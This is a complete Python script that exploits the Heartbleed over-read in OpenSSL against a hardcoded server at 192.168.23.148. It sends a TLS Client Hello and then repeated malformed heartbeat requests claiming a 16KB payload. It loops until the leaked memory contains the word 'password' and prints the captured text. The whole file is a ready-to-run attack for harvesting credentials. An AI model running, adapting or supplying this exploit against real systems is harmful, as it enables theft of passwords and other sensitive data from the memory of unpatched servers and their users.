import socket
import time

# --- CONFIGURATION ---
TARGET_IP = "192.168.23.148"
PORT = 443

# TLS Client Hello Packet
# This initiates the SSL/TLS session. Without this handshake, 
# the server would ignore our heartbeat requests.
client_hello = (
    b"\x16\x03\x02\x00\x31\x01\x00\x00\x2d\x03\x02\x50\x0b\xaf\xbb\xb7"
    b"\x5a\x02\x3b\xfd\xc0\xff\x01\xad\x02\x42\x28\x91\xd1\x39\x69\x6a"
    b"\x28\x1a\x12\x60\x07\x3c\xed\xac\xfc\x3f\xfc\x00\x00\x04\x00\x33"
    b"\x00\xff\x01\x00\x00\x00"
)

# Malformed Heartbeat Payload
# We declare a payload length of 16KB (0x4000) but provide only 3 bytes.
# This triggers the "over-read" vulnerability in OpenSSL.
hb_payload = b"\x18\x03\x02\x00\x03\x01\x40\x00"

def exploit():
    """Continuously monitors the target until a password is found."""
    print(f"[*] Starting monitoring on {TARGET_IP}. Waiting for victim...")
    
    while True:
        try:
            # We open a new connection for each handshake cycle
            # to ensure the session remains fresh.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, PORT))
            
            # Phase 1: Establish Handshake
            s.send(client_hello)
            time.sleep(0.1)
            s.recv(4096) # Discard the Server Hello response

            # Phase 2: Heartbeat Burst
            # We send 10 consecutive heartbeats on the same connection
            # to increase the chances of hitting the RAM exactly when a user logs in.
            for _ in range(10):
                s.send(hb_payload)
                try:
                    response = s.recv(16384)
                    
                    # Search for the 'password' keyword within the leaked memory chunk
                    if b"password" in response:
                        print("\n" + "!"*50)
                        print("[!!!] PASSWORD INTERCEPTED!")
                        print("!"*50)
                        
                        # Clean the data: decode bytes to ASCII and ignore binary noise
                        full_data = response.decode('ascii', errors='ignore')
                        
                        # Find the start of the password string and print the next 100 characters
                        start = full_data.find("password")
                        print(full_data[start:start+100]) 
                        
                        print("!"*50)
                        return # SUCCESS: Exit the entire script
                except:
                    # If the server closes the connection during the burst, 
                    # break out of the inner loop and reconnect.
                    break 
            
            s.close()
            # Visual feedback: a dot appears for every successful monitoring cycle
            print(".", end="", flush=True) 
            
        except Exception:
            # If the server is unreachable or resets, wait 1 second and retry
            time.sleep(1)

if __name__ == "__main__":
    try:
        exploit()
    except KeyboardInterrupt:
        # Allows the user to stop the loop gracefully with Ctrl+C
        print("\n[*] Manual stop requested by user.")
